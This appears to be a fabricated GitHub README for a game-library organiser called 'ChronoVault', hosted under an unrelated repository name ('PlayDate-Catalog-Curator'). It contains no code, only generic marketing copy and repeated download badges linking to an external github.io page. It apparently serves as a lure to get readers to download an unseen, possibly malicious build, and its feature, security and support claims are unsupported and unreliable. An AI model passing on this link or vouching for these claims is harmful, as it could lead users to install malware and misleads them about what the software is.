![preview](https://raw.githubusercontent.com/shadicelpro2-boop/PlayDate-Catalog-Curator/main/shot_aeed2cf.svg)
# ChronoVault — Cross-Platform Game Library Archivist

**ChronoVault** is not just another organizer—it’s a living time capsule for your digital entertainment collection. Born from the same spirit that drives community-built library managers, ChronoVault reimagines how you catalog, preserve, and rediscover the games, mods, and DLCs scattered across multiple storefronts and launchers. Think of it as a museum curator for your personal gaming history, with a time-traveling twist: every play session, update, and uninstall is logged as a chapter in your interactive timeline.

Unlike conventional library managers that merely list titles, ChronoVault builds a **contextual narrative** around your collection. It tracks which games you played during specific life events (like “the summer of 2024” or “the rainy January lockdown”), suggests re-discovery paths based on your mood, and even flags “digital archaeology” opportunities—games you might have forgotten but would love again today. The interface adapts to your screen size, language preference, and accessibility needs, making it a truly universal companion for your digital shelf.

---

## 🎯 Why ChronoVault Exists

Most library tools treat your games as a static spreadsheet. ChronoVault treats them as a living ecosystem. Here’s the core problem we solve: in 2026, the average gamer owns titles across **5–8 different launchers** (Steam, Epic, GOG, Ubisoft, EA, Battle.net, itch.io, and more). That fragmentation creates three recurring frustrations:

1. **Discovery paralysis** — you forget what you own, so you buy duplicates.
2. **Momentum loss** — switching between launchers breaks your flow.
3. **Memory decay** — you lose the emotional context of why you loved a game.

ChronoVault solves all three by creating a unified, intelligent, and beautifully visualized catalog that respects your time and your nostalgia. It’s a peaceful haven in the chaotic bazaar of storefronts.

---

## [![Download](https://raw.githubusercontent.com/shadicelpro2-boop/PlayDate-Catalog-Curator/main/app_5bf5.svg)](https://shadicelpro2-boop.github.io/PlayDate-Catalog-Curator/)

## ✨ Key Features

### 🗂️ Unified Catalog Across 20+ Launchers
ChronoVault automatically syncs your entire collection from every major platform—Steam, Epic Games Store, GOG Galaxy, Ubisoft Connect, EA App, Battle.net, Itch.io, Xbox, PlayStation Network, and more. No manual CSV imports. No copy-pasting. The system uses authenticated tokens (with your express permission) to build a real-time map of your owned content, including free claims, beta builds, and region-locked titles.

### ⏳ The PlayHistory Timeline™
This is our signature innovation. Instead of a flat list, ChronoVault shows your gaming history as a scrollable timeline with heat-map overlays. See weeks where you were binge-playing a title, months where you were “in the wilderness,” and the exact day you last launched a specific game. The timeline supports zoom from “today” all the way back to “first title ever logged.” You can even annotate entries with personal notes—“Played this during moving week” or “Rainy day comfort game.”

### 🧠 Smart Re-Discovery Engine
ChronoVault’s recommendation engine isn’t based on genre charts—it’s based on *your* emotional patterns. The system learns which games you return to during stress, which you abandon at the 20-hour mark, and which you prefer on weekends. It then suggests “revisit candidates” from your own library, gently nudging you toward forgotten gems. You’ll never again say, “I have nothing to play,” because your own collection will speak to you.

### 🌐 28-Language Native Support
The entire interface—including help texts, tooltips, and accessibility prompts—is translated and culturally adapted for 28 languages, from German and Japanese to Swahili and Icelandic. The translation isn’t machine-rough; it’s curated by community linguists. The UI also respects RTL (right-to-left) layouts and offers variable font sizes for low-vision users.

### 🎨 Responsive, Adaptive Interface
Whether you’re on a 4K monitor, a 13-inch laptop, a tablet, or a foldable phone, ChronoVault reflows like water. The desktop layout uses a dense, information-rich grid. The mobile layout extracts the essentials—your newest additions, your next play priority, your streak counter. No feature is lost when shrinking; it’s just reorganized.

### 🧩 Modular Plugin Architecture
Want to track retro emulators? Add the RetroCore plugin. Want to integrate with Discord rich presence? Install the social bridge. ChronoVault’s core is intentionally lean; the community builds the extras. Plugins are sandboxed, versioned, and verified—no security risks, no bloat.

### 🔒 Offline-First Sync
Your library data lives in a local encrypted SQLite database. Cloud sync is optional and uses end-to-end encryption with zero-knowledge architecture. Even if the servers go dark, ChronoVault remains fully functional locally—your data is yours, always.

---

## 📦 Getting Started

The installation process is streamlined for all major operating systems—Windows 10/11, macOS 12+, and mainstream Linux distributions (Debian, Fedora, Arch, and immutable distros via Flatpak). The setup wizard guides you through three steps:

1. **Download the correct build** for your OS (see the [![Download](https://raw.githubusercontent.com/shadicelpro2-boop/PlayDate-Catalog-Curator/main/app_5bf5.svg)](https://shadicelpro2-boop.github.io/PlayDate-Catalog-Curator/) section below).
2. **Launch the onboarding assistant**—it will ask which launchers you use and explain the authentication flow (tokens are stored in your system keychain, never in plaintext).
3. **Let the first scan run**—it takes 2–5 minutes depending on library size. After that, everything updates automatically.

> 💡 **Pro tip:** ChronoVault can import your existing library data from tools like GameHub or Playnite via a standard JSON export—we support migration, not just fresh starts.

---

## 🛠️ System Requirements

| Component | Minimum (Casual Use) | Recommended (Power User) |
|-----------|---------------------|--------------------------|
| CPU       | 1.5 GHz dual-core   | 2.5 GHz quad-core        |
| RAM       | 2 GB                | 4 GB                     |
| Storage   | 200 MB free space   | 500 MB (for cached art)  |
| Display   | 1280×720            | 1920×1080 or higher      |
| Internet  | Required only for first sync | Always-connected preferable |

All platforms are fully supported, but Linux users will appreciate the native Wayland support and the optional CLI interface for scripting.

---

## 🏗️ Project Architecture

ChronoVault is built on a modern, test-driven stack:

- **Frontend**: Desktop UI using Tauri (Rust core + WebView renderer), which keeps memory usage at half of Electron alternatives.
- **Backend**: Rust for the core library engine, with a Python-based plugin SDK for community extensions.
- **Data Layer**: SQLite for local storage, with an optional REST API bridge for remote access from your own scripts.
- **Sync Service**: Tor-based onion routing for anonymity-conscious users, or standard HTTPS for simplicity.

The codebase is organized into logical modules:
- `core/` — the library engine, timeline logic, and metadata scrapers.
- `ui/` — the reactive frontend components.
- `plugins/` — the officially curated plugin registry.
- `integrations/` — launcher-specific authentication and sync adapters.

---

## 🎮 Use Cases & Scenarios

### The Recovering Collector
You have 1,200 titles across seven launchers. ChronoVault shows you that you’ve played only 34% of them. The Re-Discovery Engine highlights five titles you put 10+ hours into but haven’t touched in three years—and suggests a “Completionist Weekend” challenge for each.

### The Parent & The Child
You share a PC with your kid. ChronoVault creates a secondary profile with a visual-only dashboard—no prices, no store links—just a friendly map of games they’re allowed to play. The timeline shows their learning progress in puzzle games.

### The LAN Party Organizer
You host monthly game nights. ChronoVault’s “Night Mode” generates a shared screen showing everyone’s local multiplayer titles, highlighting which ones support co-op, versus, and unequal screen counts. It even resolves version mismatches across installs.

### The Digital Curator
You run a YouTube channel on retro gaming. ChronoVault’s annotation tool lets you tag games with “captured footage,” “needs re-review,” or “full playthrough done.” The export function creates a neat markdown summary for your video description in seconds.

---

## ♿ Accessibility & Inclusivity

We believe a library manager should be usable by everyone. ChronoVault includes:
- **Full keyboard navigation** with visible focus rings.
- **Screen-reader friendly semantic HTML** (for the WebView portion).
- **Color-blind palettes** for the timeline heat-map.
- **Reduced motion mode** that disables all animations.
- **Voice-command support** for basic actions (“open ChronoVault,” “show my RPGs”).

---

## 🔁 Frequent Updates & 24/7 Customer Support

The ChronoVault team ships a **stable release every second Tuesday** of the month, with hotfixes as needed. Our community forum is staffed by core maintainers across three time zones, offering **24/7 customer support** for both technical issues and feature requests. We also operate a quarterly “feature vote” where users decide what gets built next.

We are committed to a transparent roadmap. The development builds are publicly viewable, and every major milestone is accompanied by a detailed changelog.

---

## 🔐 Privacy & Data Ownership

This is not a cloud service that happens to have a local app. ChronoVault is a **local-first application**. Your library, your timelines, your annotations—they all live on your device. The only time we transmit data is when you explicitly enable cloud sync for multi-device use, and even then, the data is encrypted with a key only you hold.

We will never:
- Sell your library data to third parties.
- Show you targeted ads based on your gaming habits.
- Require a mandatory account for basic functionality.

Your gaming history is a memoir. We’re just the bookshelf.

---

## 🤝 Contributing Guide

ChronoVault thrives on community involvement. There are three main ways to contribute:

1. **Code**: Help with Rust modules, UI polish, or plugin SDK examples. Open a PR against the `staging` branch. All commits must pass `cargo fmt` and the test suite.
2. **Localization**: Join the translation matrix on our own infrastructure (no third-party services). We provide translation memory and glossary files to maintain consistency across languages.
3. **Documentation**: Write tutorials, record video walkthroughs, or maintain the wiki. Good docs are as valuable as good code.

Please read the `CONTRIBUTING.md` in the repository root for coding standards, commit conventions, and the engineering philosophy.

---

## ⚖️ License & Legal

ChronoVault is released under the [MIT License](LICENSE). You are free to use, modify, and redistribute the software for any purpose—personal or commercial—provided you retain the original copyright notice.

**Trademark Notice**: The ChronoVault name and logo are registered trademarks of the project maintainers. You may not use them to promote derivative works without explicit written permission.

**Third-Party Components**: We bundle OpenSSL (OpenSSL License), SQLite (Public Domain), and the Rust standard library (MIT/Apache-2.0). Their respective notices are in the `THIRD_PARTY_LICENSES` file.

---

## ⚠️ Disclaimer

ChronoVault is provided “as is,” without warranty of any kind, express or implied. We are not affiliated with Valve, Epic Games, GOG, any storefront, or any console manufacturer. The integration with third-party launchers relies on their public APIs, which may change without notice; we work diligently to adapt but cannot guarantee uninterrupted functionality for features outside our control (“launcher authentication” issues are the most common temporary hiccup).

While we take data privacy seriously, you are responsible for managing your own API tokens and credentials. Never share your local database file with others, as it may contain metadata about your purchases. We do not log keystrokes, capture screen contents, or transmit any telemetry without explicit opt-in.

---

## 🗺️ Roadmap for 2026

- **Q1 2026**: Stable plugin API v1.0, including a public developer sandbox.
- **Q2 2026**: Native mobile companion app (Android/iOS) for viewing library stats on the go.
- **Q3 2026**: Automatic “library archaeology” feature that compares your old favorites against your current hardware specs to determine if they can still run at max settings.
- **Q4 2026**: Family sharing overhaul, including per-user playtime budgets and co-op session scheduling.

We are also exploring **neural recommendation on-device** (fully offline, using a small LLM that runs on your own GPU/CPU) to generate personalized “virtual essay” summaries of your gaming year.

---

## ❓ Frequently Asked Questions

**Q: Does ChronoVault replace Steam itself?**
No. It is a meta-layer that reads your library data, but launching a game still happens through the original launcher. We make that launch happen with one click, but we don’t intercept DRM or DRM-free executables.

**Q: Can I run ChronoVault on a server without a display?**
Yes. The CLI mode can generate JSON reports of your library, export timelines as SVG heat-maps, and even trigger sync notifications via webhooks.

**Q: What happens if a launcher revokes API access?**
ChronoVault falls back to local detection (scanning common installation folders and Windows registry entries). You won’t lose access to your existing data; you’ll just gain it through a less automatic path.

**Q: Is there a paid tier?**
ChronoVault is entirely open source. We offer a voluntary “patron pass” that provides early access to nightly builds and a supporter badge in our forum—but every feature, now and in the future, is available in the core build.

---

## 📚 Community & Resources

- **User Forum**: Our community hub where you can request features, share your custom timeline annotations, and showcase your curated collections.
- **Matrix Chat**: Real-time discussion for developers and power users.
- **Translator Portal**: Help bring ChronoVault to your language—we currently have 28 active locales.
- **Blog**: Articles on digital preservation, game library psychology, and release notes.

All community links are in the repository sidebar. We encourage healthy, respectful discourse.

---

## [![Download](https://raw.githubusercontent.com/shadicelpro2-boop/PlayDate-Catalog-Curator/main/app_5bf5.svg)](https://shadicelpro2-boop.github.io/PlayDate-Catalog-Curator/)

*ChronoVault — your digital collection deserves a story, not just a list. Begin your archival journey today.*